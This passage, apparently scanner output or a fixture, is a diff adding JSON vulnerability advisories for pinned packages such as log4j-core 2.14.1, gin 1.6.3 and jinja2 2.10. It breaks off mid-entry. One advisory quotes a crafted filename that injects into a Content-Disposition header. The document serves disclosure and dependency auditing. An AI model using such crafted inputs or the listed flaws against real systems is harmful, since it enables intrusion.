@@ -1,0 +1,1892 @@
+{
+ "entries": {
+  "Go|github.com/gin-gonic/gin|v1.6.3": [
+   {
+    "advisory_id": "GHSA-2c4m-59x9-fr2g",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2023-29401",
+     "GO-2023-1737"
+    ],
+    "cve": "CVE-2023-29401",
+    "cvss": 4.3,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "The filename parameter of the Context.FileAttachment function is not properly sanitized. A maliciously crafted filename can cause the Content-Disposition header to be sent with an unexpected filename value or otherwise modify the Content-Disposition header. For example, a filename of \"setup.bat&quot;;x=.txt\" will be sent as a file named \"setup.bat\".\n\nIf the FileAttachment function is called with names provided by an untrusted source, this may permit an attacker to cause a file to be served with a name different than provided. Maliciously crafted attachment file name can modify the Content-Disposition header.",
+    "fixed_versions": [
+     "1.9.1"
+    ],
+    "id": "GHSA-2c4m-59x9-fr2g",
+    "matching_method": "exact_package_version_query",
+    "modified": "2023-11-08T04:12:18.674169Z",
+    "provider": "OSV",
+    "published": "2023-05-12T20:19:25Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Gin Web Framework does not properly sanitize filename parameter of Context.FileAttachment function",
+    "url": "https://osv.dev/vulnerability/GHSA-2c4m-59x9-fr2g"
+   },
+   {
+    "advisory_id": "GHSA-3vp4-m3rf-835h",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2023-26125"
+    ],
+    "cve": "CVE-2023-26125",
+    "cvss": 5.6,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
+    "cvss_version": "3.1",
+    "details": "Versions of the package github.com/gin-gonic/gin before version 1.9.0 are vulnerable to Improper Input Validation by allowing an attacker to use a specially crafted request via the X-Forwarded-Prefix header, potentially leading to cache poisoning.\n\n**Note:** Although this issue does not pose a significant threat on its own it can serve as an input vector for other more impactful vulnerabilities. However, successful exploitation may depend on the server configuration and whether the header is used in the application logic.",
+    "fixed_versions": [
+     "1.9.0"
+    ],
+    "id": "GHSA-3vp4-m3rf-835h",
+    "matching_method": "exact_package_version_query",
+    "modified": "2023-11-08T04:11:58.943766Z",
+    "provider": "OSV",
+    "published": "2023-05-04T06:30:12Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Improper input validation in github.com/gin-gonic/gin",
+    "url": "https://osv.dev/vulnerability/GHSA-3vp4-m3rf-835h"
+   },
+   {
+    "advisory_id": "GHSA-h395-qcrw-5vmq",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-28483",
+     "GO-2021-0052",
+     "SNYK-GOLANG-GITHUBCOMGINGONICGIN-1041736"
+    ],
+    "cve": "CVE-2020-28483",
+    "cvss": 7.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "When gin is exposed directly to the internet, a client's IP can be spoofed by setting the X-Forwarded-For header. This affects all versions of package github.com/gin-gonic/gin under 1.7.7. ",
+    "fixed_versions": [
+     "1.7.7"
+    ],
+    "id": "GHSA-h395-qcrw-5vmq",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:49:05.801847827Z",
+    "provider": "OSV",
+    "published": "2021-06-23T17:53:21Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Inconsistent Interpretation of HTTP Requests in github.com/gin-gonic/gin",
+    "url": "https://osv.dev/vulnerability/GHSA-h395-qcrw-5vmq"
+   }
+  ],
+  "Maven|org.apache.commons:commons-text|1.9": [
+   {
+    "advisory_id": "GHSA-599f-7c49-w659",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2022-42889"
+    ],
+    "cve": "CVE-2022-42889",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "Apache Commons Text performs variable interpolation, allowing properties to be dynamically evaluated and expanded. The standard format for interpolation is \"${prefix:name}\", where \"prefix\" is used to locate an instance of org.apache.commons.text.lookup.StringLookup that performs the interpolation. Starting with version 1.5 and continuing through 1.9, the set of default Lookup instances included interpolators that could result in arbitrary code execution or contact with remote servers. These lookups are: - \"script\" - execute expressions using the JVM script execution engine (javax.script) - \"dns\" - resolve dns records - \"url\" - load values from urls, including from remote servers Applications using the interpolation defaults in the affected versions may be vulnerable to remote code execution or unintentional contact with remote servers if untrusted configuration values are used. Users are recommended to upgrade to Apache Commons Text 1.10.0, which disables the problematic interpolators by default.",
+    "fixed_versions": [
+     "1.10.0"
+    ],
+    "id": "GHSA-599f-7c49-w659",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-02-16T08:09:06.872889Z",
+    "provider": "OSV",
+    "published": "2022-10-13T19:00:17Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Arbitrary code execution in Apache Commons Text",
+    "url": "https://osv.dev/vulnerability/GHSA-599f-7c49-w659"
+   }
+  ],
+  "Maven|org.apache.logging.log4j:log4j-core|2.14.1": [
+   {
+    "advisory_id": "GHSA-3pxv-7cmr-fjr4",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-34480"
+    ],
+    "cve": "CVE-2026-34480",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.9,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:L/SA:N",
+    "cvss_version": "4.0",
+    "details": "Apache Log4j Core's [`XmlLayout`](https://logging.apache.org/log4j/2.x/manual/layouts.html#XmlLayout), in versions up to and including 2.25.3, fails to sanitize characters forbidden by the [XML 1.0 specification](https://www.w3.org/TR/xml/#charsets), producing invalid XML output whenever a log message or MDC value contains such characters.\n\nThe impact depends on the StAX implementation in use:\n\n  *  **JRE built-in StAX**: Forbidden characters are silently written to the output, producing malformed XML. Conforming parsers must reject such documents with a fatal error, which may cause downstream log-processing systems to drop the affected records.\n  *  **Alternative StAX implementations** (e.g., [Woodstox](https://github.com/FasterXML/woodstox), a transitive dependency of the Jackson XML Dataformat module): An exception is thrown during the logging call, and the log event is never delivered to its intended appender, only to Log4j's internal status logger.\n\nUsers are advised to upgrade to Apache Log4j Core 2.25.4, which corrects this issue by sanitizing forbidden characters before XML output.",
+    "fixed_versions": [
+     "2.25.4"
+    ],
+    "id": "GHSA-3pxv-7cmr-fjr4",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:42.492278990Z",
+    "provider": "OSV",
+    "published": "2026-04-10T18:31:17Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Apache Log4j Core: Silent log event loss in XmlLayout due to unescaped XML 1.0 forbidden characters",
+    "url": "https://osv.dev/vulnerability/GHSA-3pxv-7cmr-fjr4"
+   },
+   {
+    "advisory_id": "GHSA-6hg6-v5c8-fphq",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-34477"
+    ],
+    "cve": "CVE-2026-34477",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:L/SA:N",
+    "cvss_version": "4.0",
+    "details": "The fix for  CVE-2025-68161 was incomplete: it addressed hostname verification only when enabled via the  [`log4j2.sslVerifyHostName`](https://logging.apache.org/log4j/2.x/manual/systemproperties.html#log4j2.sslVerifyHostName) system property, but not when configured through the [`verifyHostName`](https://logging.apache.org/log4j/2.x/manual/appenders/network.html#SslConfiguration-attr-verifyHostName) attribute of the `<Ssl>` element.\n\nAlthough the `verifyHostName` configuration attribute was introduced in Log4j Core 2.12.0, it was silently ignored in all versions through 2.25.3, leaving TLS connections vulnerable to interception regardless of the configured value.\n\nA network-based attacker may be able to perform a man-in-the-middle attack when all of the following conditions are met:\n\n  *  An SMTP, Socket, or Syslog appender is in use.\n  *  TLS is configured via a nested <Ssl> element.\n  *  The attacker can present a certificate issued by a CA trusted by the appender's configured trust store, or by the default Java trust store if none is configured.\n\nThis issue does not affect users of the HTTP appender, which uses a separate [`verifyHostname`](https://logging.apache.org/log4j/2.x/manual/appenders/network.html#HttpAppender-attr-verifyHostName) attribute that was not subject to this bug and verifies host names by default.\n\nUsers are advised to upgrade to Apache Log4j Core 2.25.4, which corrects this issue.",
+    "fixed_versions": [
+     "2.25.4"
+    ],
+    "id": "GHSA-6hg6-v5c8-fphq",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:43.570169134Z",
+    "provider": "OSV",
+    "published": "2026-04-10T18:31:17Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Apache Log4j Core: `verifyHostName` attribute silently ignored in TLS configuration",
+    "url": "https://osv.dev/vulnerability/GHSA-6hg6-v5c8-fphq"
+   },
+   {
+    "advisory_id": "GHSA-7rjr-3q55-vv33",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2021-45046"
+    ],
+    "cve": "CVE-2021-45046",
+    "cvss": 9.0,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 9.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "# Impact\n\nThe fix to address [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a remote code execution (RCE) attack. \n\n## Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.\n\n# Mitigation\n\nLog4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (< 2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).\n\nLog4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.formatMsgNoLookups` to `true` do NOT mitigate this specific vulnerability.",
+    "fixed_versions": [
+     "1.10.8",
+     "1.11.11",
+     "1.9.2",
+     "2.0.12",
+     "2.12.2",
+     "2.16.0",
+     "2.3.1"
+    ],
+    "id": "GHSA-7rjr-3q55-vv33",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-10-02T20:30:05.438504645Z",
+    "provider": "OSV",
+    "published": "2021-12-14T18:01:28Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Incomplete fix for Apache Log4j vulnerability",
+    "url": "https://osv.dev/vulnerability/GHSA-7rjr-3q55-vv33"
+   },
+   {
+    "advisory_id": "GHSA-8489-44mv-ggj8",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2021-44832"
+    ],
+    "cve": "CVE-2021-44832",
+    "cvss": 6.6,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to an attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.\n\n\n# Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.\n\nThis issue does not impact default configurations of Log4j2 and requires an attacker to have control over the Log4j2 configuration, which reduces the likelihood of being exploited.",
+    "fixed_versions": [
+     "1.10.9",
+     "1.11.13",
+     "1.9.2",
+     "2.0.14",
+     "2.12.4",
+     "2.17.1",
+     "2.3.2"
+    ],
+    "id": "GHSA-8489-44mv-ggj8",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-06-09T10:45:14.253296471Z",
+    "provider": "OSV",
+    "published": "2022-01-04T16:14:20Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Improper Input Validation and Injection in Apache Log4j2",
+    "url": "https://osv.dev/vulnerability/GHSA-8489-44mv-ggj8"
+   },
+   {
+    "advisory_id": "GHSA-jfh8-c2jp-5v3q",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2021-44228"
+    ],
+    "cve": "CVE-2021-44228",
+    "cvss": 10.0,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+    "cvss_version": "3.1",
+    "details": "# Summary\n\nLog4j versions prior to 2.16.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.\nAs per [Apache's Log4j security guide](https://logging.apache.org/log4j/2.x/security.html): Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.16.0, this behavior has been disabled by default.\n\nLog4j version 2.15.0 contained an earlier fix for the vulnerability, but that patch did not disable attacker-controlled JNDI lookups in all situations. For more information, see the `Updated advice for version 2.16.0` section of this advisory.\n\n# Impact\n\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input. \n\n# Affected versions\n\nAny Log4J version prior to v2.15.0 is affected to this specific issue.\n\nThe v1 branch of Log4J which is considered End Of Life (EOL) is vulnerable to other RCE vectors so the recommendation is to still update to 2.16.0 where possible.\n\n## Security releases\nAdditional backports of this fix have been made available in versions 2.3.1, 2.12.2, and 2.12.3\n\n## Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.\n\n# Remediation Advice\n\n## Updated advice for version 2.16.0\n\nThe Apache Logging Services team provided updated mitigation advice upon the release of version 2.16.0, which [disables JNDI by default and completely removes support for message lookups](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0).\nEven in version 2.15.0, lookups used in layouts to provide specific pieces of context information will still recursively resolve, possibly triggering JNDI lookups. This problem is being tracked as [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). More information is available on the [GitHub Security Advisory for CVE-2021-45046](https://github.com/advisories/GHSA-7rjr-3q55-vv33).\n\nUsers who want to avoid attacker-controlled JNDI lookups but cannot upgrade to 2.16.0 must [ensure that no such lookups resolve to attacker-provided data and ensure that the the JndiLookup class is not loaded](https://issues.apache.org/jira/browse/LOG4J2-3221).\n\nPlease note that Log4J v1 is End Of Life (EOL) and will not receive patches for this issue. Log4J v1 is also vulnerable to other RCE vectors and we recommend you migrate to Log4J 2.16.0 where possible.",
+    "fixed_versions": [
+     "1.10.8",
+     "1.11.10",
+     "1.9.2",
+     "2.0.11",
+     "2.12.2",
+     "2.15.0",
+     "2.3.1"
+    ],
+    "id": "GHSA-jfh8-c2jp-5v3q",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-10-22T19:37:02.616807Z",
+    "provider": "OSV",
+    "published": "2021-12-10T00:40:56Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Remote code injection in Log4j",
+    "url": "https://osv.dev/vulnerability/GHSA-jfh8-c2jp-5v3q"
+   },
+   {
+    "advisory_id": "GHSA-p6xc-xr62-6r2g",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2021-45105"
+    ],
+    "cve": "CVE-2021-45105",
+    "cvss": 8.6,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H",
+    "cvss_version": "3.1",
+    "details": "Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.\n\n\n# Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.",
+    "fixed_versions": [
+     "1.10.9",
+     "1.11.12",
+     "1.9.2",
+     "2.0.13",
+     "2.12.3",
+     "2.17.0",
+     "2.3.1"
+    ],
+    "id": "GHSA-p6xc-xr62-6r2g",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-06-09T10:30:14.432177927Z",
+    "provider": "OSV",
+    "published": "2021-12-18T18:00:07Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Apache Log4j2 vulnerable to Improper Input Validation and Uncontrolled Recursion",
+    "url": "https://osv.dev/vulnerability/GHSA-p6xc-xr62-6r2g"
+   },
+   {
+    "advisory_id": "GHSA-vc5p-v9hr-52mj",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2025-68161"
+    ],
+    "cve": "CVE-2025-68161",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:L/SA:N",
+    "cvss_version": "4.0",
+    "details": "The Socket Appender in Apache Log4j Core versions 2.0-beta9 through 2.25.2 does not perform TLS hostname verification of the peer certificate, even when the  [verifyHostName](https://logging.apache.org/log4j/2.x/manual/appenders/network.html#SslConfiguration-attr-verifyHostName)  configuration attribute or the  [log4j2.sslVerifyHostName](https://logging.apache.org/log4j/2.x/manual/systemproperties.html#log4j2.sslVerifyHostName) system property is set to true.\n\nThis issue may allow a man-in-the-middle attacker to intercept or redirect log traffic under the following conditions:\n\n  *  The attacker is able to intercept or redirect network traffic between the client and the log receiver.\n  *  The attacker can present a server certificate issued by a certification authority trusted by the Socket Appender\u2019s configured trust store (or by the default Java trust store if no custom trust store is configured).\n\n\nUsers are advised to upgrade to Apache Log4j Core version 2.25.3, which addresses this issue.\n\nAs an alternative mitigation, the Socket Appender may be configured to use a private or restricted trust root to limit the set of trusted certificates.",
+    "fixed_versions": [
+     "2.25.3"
+    ],
+    "id": "GHSA-vc5p-v9hr-52mj",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:32.126499218Z",
+    "provider": "OSV",
+    "published": "2025-12-18T21:31:44Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Apache Log4j does not verify the TLS hostname in its Socket Appender",
+    "url": "https://osv.dev/vulnerability/GHSA-vc5p-v9hr-52mj"
+   }
+  ],
+  "Maven|org.hibernate:hibernate-core|3.6.10.Final": [
+   {
+    "advisory_id": "GHSA-8grg-q944-cch5",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2019-14900"
+    ],
+    "cve": "CVE-2019-14900",
+    "cvss": 6.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_version": "3.1",
+    "details": "A flaw was found in Hibernate ORM in versions before 5.3.18, 5.4.18 and 5.5.0.Beta1. A SQL injection in the implementation of the JPA Criteria API can permit unsanitized literals when a literal is used in the SELECT or GROUP BY parts of the query. This flaw could allow an attacker to access unauthorized information or possibly conduct further attacks.",
+    "fixed_versions": [
+     "5.3.18",
+     "5.4.18",
+     "5.5.0.Beta1"
+    ],
+    "id": "GHSA-8grg-q944-cch5",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-06-27T18:20:05.068274Z",
+    "provider": "OSV",
+    "published": "2022-02-10T23:05:04Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "SQL Injection in Hibernate ORM",
+    "url": "https://osv.dev/vulnerability/GHSA-8grg-q944-cch5"
+   },
+   {
+    "advisory_id": "GHSA-j8jw-g6fq-mp7h",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-25638"
+    ],
+    "cve": "CVE-2020-25638",
+    "cvss": 7.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "A flaw was found in hibernate-core in versions prior to 5.3.20.Final and in 5.4.0.Final up to and including 5.4.23.Final. A SQL injection in the implementation of the JPA Criteria API can permit unsanitized literals when a literal is used in the SQL comments of the query. This flaw could allow an attacker to access unauthorized information or possibly conduct further attacks. The highest threat from this vulnerability is to data confidentiality and integrity.",
+    "fixed_versions": [
+     "5.3.20.Final",
+     "5.4.24.Final"
+    ],
+    "id": "GHSA-j8jw-g6fq-mp7h",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-06-27T16:58:54.914316Z",
+    "provider": "OSV",
+    "published": "2022-02-09T22:57:29Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "SQL injection in hibernate-core",
+    "url": "https://osv.dev/vulnerability/GHSA-j8jw-g6fq-mp7h"
+   }
+  ],
+  "Packagist|symfony/http-foundation|4.4.49": [
+   {
+    "advisory_id": "GHSA-3rg7-wf37-54rm",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2025-64500"
+    ],
+    "cve": "CVE-2025-64500",
+    "cvss": 7.3,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+    "cvss_version": "3.1",
+    "details": "### Description\n\nThe `Request` class improperly interprets some `PATH_INFO` in a way that leads to representing some URLs with a path that doesn't start with a `/`. This can allow bypassing some access control rules that are built with this `/`-prefix assumption.\n\n### Resolution\n\nThe `Request` class now ensures that URL paths always start with a `/`.\n\nThe patch for this issue is available [here](https://github.com/symfony/symfony/commit/9962b91b12bb791322fa73836b350836b6db7cac) for branch 5.4.\n\n### Credits\n\nWe would like to thank Andrew Atkinson for discovering the issue, Chris Smith for reporting it and Nicolas Grekas for providing the fix.",
+    "fixed_versions": [
+     "5.4.50",
+     "6.4.29",
+     "7.3.7"
+    ],
+    "id": "GHSA-3rg7-wf37-54rm",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:30.521562168Z",
+    "provider": "OSV",
+    "published": "2025-11-12T21:50:37Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Symfony's incorrect parsing of PATH_INFO can lead to limited authorization bypass",
+    "url": "https://osv.dev/vulnerability/GHSA-3rg7-wf37-54rm"
+   },
+   {
+    "advisory_id": "GHSA-mrqx-rp3w-jpjp",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-50345"
+    ],
+    "cve": "CVE-2024-50345",
+    "cvss": 3.1,
+    "cvss_alternate_assessments": [
+     {
+      "score": 3.1,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 2.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "### Description\n\nThe `Request` class, does not parse URI with special characters the same way browsers do. As a result, an attacker can trick a validator relying on the `Request` class to redirect users to another domain.\n\n### Resolution\n\nThe `Request::create` methods now assert the URI does not contain invalid characters as defined by https://url.spec.whatwg.org/\n\nThe patch for this issue is available [here](https://github.com/symfony/symfony/commit/5a9b08e5740af795854b1b639b7d45b9cbfe8819) for branch 5.4.\n\n### Credits\n\nWe would like to thank Sam Mush - IPASSLab && ZGC Lab for reporting the issue and Nicolas Grekas for providing the fix.",
+    "fixed_versions": [
+     "5.4.46",
+     "6.4.14",
+     "7.1.7"
+    ],
+    "id": "GHSA-mrqx-rp3w-jpjp",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-11-03T23:05:56.908103Z",
+    "provider": "OSV",
+    "published": "2024-11-06T15:22:09Z",
+    "severity": "Low",
+    "source": "GitHub",
+    "summary": "Symfony vulnerable to open redirect via browser-sanitized URLs",
+    "url": "https://osv.dev/vulnerability/GHSA-mrqx-rp3w-jpjp"
+   }
+  ],
+  "PyPI|fastapi|0.88.0": [
+   {
+    "advisory_id": "PYSEC-2024-38",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2024-24762",
+     "GHSA-2JV5-9R88-3W3P",
+     "GHSA-QF9M-VFGH-M389",
+     "PYSEC-2026-1850"
+    ],
+    "cve": "CVE-2024-24762",
+    "cvss": 7.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "cvss_version": "3.1",
+    "details": "FastAPI is a web framework for building APIs with Python 3.8+ based on standard Python type hints. When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options. An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests. It's a ReDoS(Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This vulnerability has been patched in version 0.109.1.",
+    "fixed_versions": [
+     "0.109.1",
+     "9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc"
+    ],
+    "id": "PYSEC-2024-38",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-07T17:56:49.144644089Z",
+    "provider": "OSV",
+    "published": "2024-02-05T15:15:00Z",
+    "severity": "High",
+    "source": "PyPA",
+    "summary": "",
+    "url": "https://osv.dev/vulnerability/PYSEC-2024-38"
+   }
+  ],
+  "PyPI|jinja2|2.10": [
+   {
+    "advisory_id": "GHSA-462w-v97r-4m45",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2019-10906",
+     "PYSEC-2019-217"
+    ],
+    "cve": "CVE-2019-10906",
+    "cvss": 8.6,
+    "cvss_alternate_assessments": [
+     {
+      "score": 8.6,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+      "version": "3.0"
+     }
+    ],
+    "cvss_preferred_score": 7.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "In Pallets Jinja before 2.10.1, `str.format_map` allows a sandbox escape.\n\nThe sandbox is used to restrict what code can be evaluated when rendering untrusted, user-provided templates. Due to the way string formatting works in Python, the `str.format_map` method could be used to escape the sandbox.\n\nThis issue was previously addressed for the `str.format` method in Jinja 2.8.1, which discusses the issue in detail. However, the less-common `str.format_map` method was overlooked. This release applies the same sandboxing to both methods.\n\nIf you cannot upgrade Jinja, you can override the `is_safe_attribute` method on the sandbox and explicitly disallow the `format_map` method on string objects.",
+    "fixed_versions": [
+     "2.10.1"
+    ],
+    "id": "GHSA-462w-v97r-4m45",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-09-24T21:03:59.802687Z",
+    "provider": "OSV",
+    "published": "2019-04-10T14:30:24Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Jinja2 sandbox escape via string formatting",
+    "url": "https://osv.dev/vulnerability/GHSA-462w-v97r-4m45"
+   },
+   {
+    "advisory_id": "GHSA-cpwx-vrp4-4pq7",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2025-27516",
+     "PYSEC-2026-1471"
+    ],
+    "cve": "CVE-2025-27516",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.",
